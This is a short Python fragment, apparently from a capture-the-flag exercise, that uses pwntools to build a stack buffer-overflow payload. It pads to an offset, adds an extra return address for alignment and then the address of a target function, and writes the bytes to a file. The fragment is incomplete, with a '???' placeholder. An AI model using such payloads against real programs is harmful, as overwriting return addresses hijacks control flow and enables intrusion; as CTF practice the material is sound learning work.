payload =  b""
payload += b"D" * OFFSET
payload += pwn.p64(easy_addr + ???) #OR payload += p64(0x40061c) JUST HAS TO BE ANY return addr

payload += pwn.p64(easy_addr)

with open("payload", "wb") as fp:
    fp.write(payload)

